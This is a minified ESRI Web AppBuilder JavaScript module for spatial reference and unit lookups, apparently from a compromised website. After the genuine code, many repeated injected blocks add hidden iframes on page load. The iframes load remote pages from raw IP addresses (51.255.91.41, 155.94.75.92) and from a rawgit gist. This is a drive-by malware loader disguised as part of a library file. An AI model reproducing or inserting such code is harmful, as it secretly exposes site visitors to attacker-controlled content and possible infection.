// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define("dojo/_base/declare dojo/_base/lang dojo/_base/array dojo/Deferred dojo/promise/all dojo/request esri/SpatialReference ./unitUtils".split(" "),function(g,m,f,n,p,l,k,e){var d=null,h=null,c=!1,b=g(null,function(){});g=require.toUrl("jimu");var q=l(g+"/SpatialReference/cs.json",{handleAs:"json"}),r=l(g+"/SpatialReference/transform.json",{handleAs:"json"});b.loadResource=function(){var a=new n;if(d&&h)return a.resolve(),a;p([q,r]).then(function(b){d=b[0];h=b[1];c=!0;a.resolve()},function(b){console.error(b);
c=!1;a.reject(b)});return a};b.getAllCSUnits=function(){if(c){var a=[];f.forEach(d.wkids,m.hitch(this,function(b){b=this.getCSUnit(b);-1===f.indexOf(a,b)&&a.push(b)}));return a}};b.convertUnit=function(a,b,d){if(c)return e.convertUnit(a,b,d)};b.getUnitRate=function(a,b){if(c)return e.getUnitRate(a,b)};b.isProjectUnit=function(a){if(c)return e.isProjectUnit(a)};b.isGeographicUnit=function(a){if(c)return e.isGeographicUnit(a)};b.getGeographicUnits=function(){if(c)return e.getGeographicUnits()};b.getProjectUnits=
function(){if(c)return e.getProjectUnits()};b.getCSUnit=function(a){if(c)return a=f.indexOf(d.wkids,a),d.units[a]};b.isSameSR=function(a,b){if(c)return a=this.indexOfWkid(a),b=this.indexOfWkid(b),d.labels[a]===d.labels[b]};b.isValidWkid=function(a){if(c)return-1<this.indexOfWkid(a)};b.getSRLabel=function(a){if(c&&this.isValidWkid(a))return a=this.indexOfWkid(a),d.labels[a]};b.indexOfWkid=function(a){if(c)return f.indexOf(d.wkids,a)};b.isWebMercator=function(a){return k.prototype._isWebMercator?k.prototype._isWebMercator.apply({wkid:parseInt(a,
10)},[]):(new k(parseInt(a,10))).isWebMercator()};b.standardizeWkid=function(a){return this.isWebMercator(a)?3857:parseInt(a,10)};b.isValidTfWkid=function(a){if(c)return-1<this.indexOfTfWkid(a)};b.getTransformationLabel=function(a){if(c)return this.isValidTfWkid(a)?(a=this.indexOfTfWkid(a),h.labels[a]):""};b.indexOfTfWkid=function(a){if(c)return f.indexOf(h.tfWkids,a)};b.isGeographicCS=function(a){if(c)return this.isValidWkid(a)?(a=this.indexOfWkid(a),!d.projSR[a]):!1};b.isProjectedCS=function(a){if(c)return this.isValidWkid(a)?
(a=this.indexOfWkid(a),d.projSR[a]):!1};b.getGeoCSByProj=function(a){if(c&&this.isProjectedCS(a))return a=this.indexOfWkid(a),d.spheroids[a]};b.getSpheroidStr=function(a){if(c)return this.isGeographicCS(a)?d.labels[this.indexOfWkid(a)]:this.isProjectedCS(a)?(a=b.getGeoCSByProj(a),d.labels[this.indexOfWkid(a)]):null};b.isSameSpheroid=function(a,b){if(c)return a=this.getSpheroidStr(a),b=this.getSpheroidStr(b),a&&b&&a===b?!0:!1};return b});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});